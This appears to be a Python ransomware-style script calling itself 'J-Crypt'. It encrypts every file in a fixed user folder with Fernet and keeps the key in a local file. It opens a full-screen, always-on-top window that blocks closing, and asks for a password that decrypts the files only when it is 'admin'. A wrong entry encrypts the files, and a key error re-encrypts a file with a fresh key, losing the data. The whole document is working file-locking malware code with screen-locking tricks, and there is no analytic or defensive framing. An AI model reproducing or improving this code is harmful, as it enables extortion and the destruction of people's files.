import os
import cryptography
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import simpledialog
from tkinter import messagebox
import plyer
from plyer import notification

root = tk.Tk()
root.withdraw()
root.overrideredirect(True)
root.geometry("{0}x{1}+0+0".format(root.winfo_screenwidth(), root.winfo_screenheight()))
root.attributes("-topmost", True)

def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key

def read_key():
    with open("key.key", "rb") as key_file:
        key = key_file.read()
    return key

def encrypt_file(file_name, key):
    with open(file_name, "rb") as f:
        data = f.read()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)
    with open(file_name, "wb") as f:
        f.write(encrypted_data)
    print(f"{file_name} has been encrypted successfully")

def decrypt_file(file_name, key):
    with open(file_name, "rb") as f:
        data = f.read()
    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(data)
    with open(file_name, "wb") as f:
        f.write(decrypted_data)
    print(f"{file_name} has been decrypted successfully")

folder = "C:\\Users\\alfredo\\Downloads\\my files"
file_list = [f for f in os.listdir(folder) if os.path.isfile(os.path.join(folder, f))]

if os.path.exists("key.key"):
    key = read_key()
else:
    key = generate_key()

root = tk.Tk()

def prevent_close(event):
    pass

root.withdraw()
root.protocol("WM_DELETE_WINDOW", prevent_close)
root.overrideredirect(True)
root.geometry("{0}x{1}+0+0".format(root.winfo_screenwidth(), root.winfo_screenheight()))
root.attributes("-topmost", True)
root.overrideredirect(True)
button = tk.Button(root, text="Exit", command=root.destroy)
password = simpledialog.askstring("Password", "WARNING!, Your files are encrypted using J-Crypt Please enter password to unlock it :):", show='*')

if password == "admin":
    for file_name in file_list:
        try:
            decrypt_file(os.path.join(folder, file_name), key)
        except cryptography.fernet.InvalidToken:
            messagebox.showerror("Error", "The key is invalid.")
            key = generate_key()
            encrypt_file(os.path.join(folder, file_name), key)
            messagebox.showinfo("Info", "The file has been encrypted with a new key.")
    messagebox.showinfo("Info", "Your file is decrypted")
else:
    for file_name in file_list:
        encrypt_file(os.path.join(folder, file_name), key)
    messagebox.showwarning("Warning", "Wrong password. Your files have been encrypted")
